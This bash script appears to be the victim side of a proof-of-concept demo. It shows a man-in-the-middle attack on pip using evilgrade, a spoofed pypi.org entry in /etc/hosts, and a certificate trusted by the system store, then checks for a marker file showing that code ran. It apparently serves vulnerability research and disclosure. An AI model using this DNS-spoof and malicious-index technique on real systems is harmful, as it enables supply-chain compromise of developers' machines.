#!/bin/bash
###############################################################################
# victim_pip.sh - VICTIM side only. Runs a real `pip install` against an
#                 evilgrade you already started in another console.
#
# Does NOT start or stop evilgrade. Assumes:
#   * evilgrade is running with pypi_update enabled and sslcert certs/emudhra_mitm
#     on <sslport> (default 443),
#   * pypi.org resolves to evilgrade (DNS spoof / evilgrade DNS / /etc/hosts).
#
# Adds the /etc/hosts entry itself (sudo, reverted on exit) unless you pass
# --no-hosts (e.g. when evilgrade's DNS already handles it).
#
# Usage:
#   demo/emudhra_mitm/victim_pip.sh [sslport] [--no-hosts]
#
# Uses the SYSTEM python3 (/usr/bin/python3) with --cert /etc/ssl/cert.pem to
# model a pip that trusts the system store. pip's default certifi is NOT
# vulnerable.
###############################################################################
set -u
PORT=443; NOHOSTS=0
for a in "$@"; do case "$a" in --no-hosts) NOHOSTS=1;; [0-9]*) PORT="$a";; esac; done
HOSTS_LINE="127.0.0.1 pypi.org files.pythonhosted.org"
if [ "$PORT" = "443" ]; then IDX="https://pypi.org/simple/"; else IDX="https://pypi.org:$PORT/simple/"; fi

HOSTS_ADDED=0
cleanup(){ [ "$HOSTS_ADDED" = 1 ] && { sudo sed -i '' "\|^${HOSTS_LINE}\$|d" /etc/hosts 2>/dev/null; echo "[cleanup] reverted /etc/hosts"; }; }
trap cleanup EXIT INT TERM

if [ "$NOHOSTS" = 0 ] && ! grep -qF "$HOSTS_LINE" /etc/hosts 2>/dev/null; then
    echo "== DNS spoof: adding '$HOSTS_LINE' to /etc/hosts (sudo; reverted on exit) =="
    echo "$HOSTS_LINE" | sudo tee -a /etc/hosts >/dev/null || { echo "   sudo failed"; exit 1; }
    HOSTS_ADDED=1
fi

rm -f /tmp/OWNED_BY_PIP
echo "== VICTIM: pip install evilpkg (-> evilgrade on :$PORT) =="
echo "   \$ /usr/bin/python3 -m pip install --cert /etc/ssl/cert.pem --index-url $IDX evilpkg"
timeout 90 /usr/bin/python3 -m pip install --cert /etc/ssl/cert.pem \
    --no-build-isolation --no-cache-dir --disable-pip-version-check \
    --index-url "$IDX" evilpkg 2>&1 | tail -6 | sed 's/^/   /'
/usr/bin/python3 -m pip uninstall -y evilpkg >/dev/null 2>&1
sleep 1
echo
echo "== PROOF: /tmp/OWNED_BY_PIP =="
[ -f /tmp/OWNED_BY_PIP ] && sed 's/^/   /' /tmp/OWNED_BY_PIP || echo "   <not created>"
